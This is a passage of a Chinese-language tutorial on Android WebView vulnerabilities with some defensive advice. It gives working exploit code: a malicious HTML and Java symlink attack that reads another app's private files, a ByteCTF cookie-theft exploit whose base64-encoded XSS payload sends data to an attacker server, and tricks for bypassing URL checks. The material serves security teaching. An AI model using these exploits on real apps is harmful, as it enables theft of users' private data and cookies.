
### 恶意APP的HTML,被检测APP加载此html，执行JS代码
```html
<html>
<body></body>
<script>
var d = document;
function loadDatabase()
{
var file_url = d.URL;
var xmlhttp = new XMLHttpRequest();
xmlhttp.onload = function() {
document.body.appendChild(d.createTextNode(xmlhttp.responseText))
alert(xmlhttp.responseText);
}
xmlhttp.open("GET",file_url);
xmlhttp.send(null);
}
setTimeout(loadDatabase(),8000);
#延迟8秒执行。利用时间差和软链接来获取被攻击APP的私有文件
</script>
</html>
```

#### 构造恶意APP的攻击代码
```java
#恶意APP的攻击代码
try {
String HTML = "恶意APP的HTML,在上面的HTML代码";
#新建文件夹，用于存放恶意HTML文件
cmdexec("mkdir /data/data/mm.xxxxx.testdemo3/files");
#将恶意HTML到恶意APP的沙盒目录
cmdexec("echo \"" + HTML + "\" >  /data/data/mm.xxxxx.testdemo3/files/attack.html");
#授权目录及其文件权限，允许其它应用访问
cmdexec("chmod -R 777 /data/data/mm.xxxxx.testdemo3/files");
Thread.sleep(1000);
#启动被攻击的APP，并携带恶意HTML
invokeVulnAPP("file://" + HTML_PATH);
#延时6秒
Thread.sleep(6000);
#删除HTML文件
cmdexec("rm " + HTML_PATH);
#软链接文件，实现读取被攻击应用的private.txt文件
cmdexec("ln -s " + "/data/data/mm.xxxxx.testdemo3/files/private.txt" + " " + HTML_PATH);
} catch (Exception e) {
// TODO: handle exception
}
```

#### 目标样本
```java
#被攻击的APP，有漏洞的代码
WebView webView = findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccess(true);  允许加载File域
Intent i = getIntent();
if (i != null) {
mUri = i.getData();
#取出了恶意HTML
}
if (mUri != null) {
url = mUri.toString();
}
if (url != null) {
webView.loadUrl(url);
#加载了恶意HTML
}
```

#### 实现效果
![image-20220729205923022](https://bbs.kanxue.com/upload/attach/202207/905443_MVC4SUBBHJSTKTW.png)

**安全防护：**
`1`、`设置setAllowFileAccess方法为false,设置setAllowFileAccessFromFileURLs和setAllowUniversalAccessFromFileURLs为false。`
`2`、`在Android4.0(API15)及以下得采用其他方法进行手动校验是否访问file域`
`3`、`当WebView所在Activity存在组件暴露时，若不是必要的组件暴露，应该禁止组件暴露`

### （4）污染Cooike漏洞

本漏洞参考：[Android-Webview中的漏洞利用总结](https://bbs.kanxue.com/elink@10fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3y4@1k6X3W2G2N6q4)9J5k6h3y4G2L8g2)9J5c8U0x3&6y4U0f1$3i4K6u0W2K9s2c8E0L8l9`.`.)

![image-20220729210229976](https://bbs.kanxue.com/upload/attach/202207/905443_S87ZFVBHZ6D2TBM.png)

**漏洞原理：**

攻击者创造符号链接，然后绕过校验，访问攻击的html，再通过软链接去加载symlink.html，然后窃取Cooike，如下图所示：

![image-20220730141203355](https://bbs.kanxue.com/upload/attach/202207/905443_77ZAYZGTZQZH6FK.png)

**漏洞复现：**

首先创建了符号链接，然后过URL校验，访问我们的服务器 394K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3W2H3i4@1f1#2i4K6W2o6i4@1t1H3i4@1f1#2i4K6W2p5i4K6R3H3i4K6u0r3k6h3q4K6P5h3c8J5L8$3W2V1i4K6u0W2K9s2c8E0L8l9`.`. :

建立一个easydroid.html，它里面有两个重定向：一个是设置Cookie，一个是加载与Cookies文件符号链接后的那个html文件

`easydroid.html`
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>evil</title>
</head>
<body>
<h1>injected cookie with xss</h1>
<script>
document.cookie = "sendData = '<img src=\"evil\" onerror=\"eval(atob('dmFyIGJhc2VVcmwgPSAiaHR0cDovLzEwLjcuODkuMTA4L015VGVzdC9SZWNlaXZlU2VydmxldD8iCm5ldyBJbWFnZSgpLnNyYyA9IGJhc2VVcmwgKyAiY29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw=='))\">'"
var baseUrl = "http://****/MyTest/ReceiveServlet?"
new Image().src = baseUrl + "cookie=" + encodeURIComponent("open evil page.");
setTimeout(function() {
location.href = 'intent:#Intent;component=com.bytectf.easydroid/.TestActivity;S.url=file%3A%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwneasydroid%2Fsymlink.html;end';
}, 40000);
</script>
</body>
</html>
```

**攻击代码：**
```java
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);
symlink();
Intent intent =
new Intent();
intent.setClassName("com.bytectf.easydroid","com.bytectf.easydroid.MainActivity");
intent.setData(Uri.parse("43cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4c8G2N6i4c8A6j5h3!0Q4x3X3g2U0L8$3#2Q4y4o6m8Q4x3V1q4Q4x3V1q4Q4x3V1q4Q4x3V1q4Q4x3V1k6W2j5i4y4&6k6s2u0G2K9h3c8Q4x3X3g2Z5N6r3#2D9"));
startActivity(intent);
}
private String symlink() {
try {
String root = getApplicationInfo().dataDir;
String symlink = root + "/symlink.html";
String cookies = getPackageManager().getApplicationInfo("com.bytectf.easydroid", 0).dataDir + "/app_webview/Cookies";
Runtime.getRuntime().exec("rm " + symlink).waitFor();
Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();
Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();
return symlink;
} catch (Throwable th) {
throw new RuntimeException(th);
}
}
```

通过Intent重定向，首先加载exp.html来设置cookie，然后再加载symlink.html，将所要Cookies内容返回给我们的服务器。最终达到窃取Cookies的目的。注意，这里要保证`setAllowFileAccess(true)`，API 29以下默认为true，否则会利用失败

效果显示：
![image-20220730141455146](https://bbs.kanxue.com/upload/attach/202207/905443_ZQPJJJMRSH4ZEJA.png)

### 3.URL配置漏洞

在WebView漏洞中，许多URL可以通过各种方式去绕过验证，从而引起各式各样的漏洞

URL的结构如下：
`scheme://login:password@address:port/path/to/resource/?query_string#fragment`

- scheme
不区分大小写，包括http、https、file、ftp等等,:之后的“//”可省略，例如http:994K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4q4I4i4K6u0W2j5$3!0E0i4K6u0o6 此外，多数浏览器在scheme之前加空格也是可以正常解析的

- login:password@（认证信息）
服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个不常见字段往往可以绕过很多检查

- address
address字段可以是一个不区分大小写的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法

- port
端口号

- /path/to/resource
层级路径，可以使用“../”到上一级目录

- query_string
查询字符串，格式为”query_string?name1=value1&name2=value2”

- fragment
用于html中的页面定位

#### （1）URL绕过漏洞

**漏洞原理：**

##### <1>通用的URL绕过

首先我们来看一个简单的url校验例子：
```java
if(checkDomain(url)){
enableJavaScriptInterface();
// 或者webview.load(url)
}
```

这里是对url进行域名校验，然后开启我们的`enableJavaScriptInterface`接口可以访问js文件

我们在实际中会发现这样的例子：
```java
if(url.startsWith("file://")){
setJavaScriptEnbled(false);
}else{
setJavaScriptEnbled(true);
}
```

很明显这里是开发者为了防止加载file的同源策略进行的防护，但是我们有很多的绕过方法：

总结：
`(1) 大写字母 “File://”`
`(2) 前面加上空格： “ file://”`
`(3) 字符编码：“file：%2F/”`
`(4) 可正常访问的畸形路径：“file:sdcard/attack/html” 或 “file:////sdcard/attack.html”`

##### <2> 常见的url校验

我们还可以发现在一般的url中会对首尾进行校验
```java
if(host.endsWith("mysite.com")){
enableJavascriptInterface();
}
```
存在问题：endWith未闭合点号

`绕过：evilmysite.com`
`修复：endsWith(".mysite.com")`

使⽤startsWith、contains、indexOf、正则匹配等⾮严格字符串匹配
```java
if(host.startsWith("mysite.com")){
enableJavascriptInterface();
}
```
`绕过：mysite.com@oppo.com`

**contains+indexOf绕过：**
`任何可以添加字符串的字段`
`子域名 huawei.com.mysite.com`
`子路径 mysite.com/huawei.com`
`参数 mysite.com/xxxx#huawei.com`

**//和第一个/之间提取host**
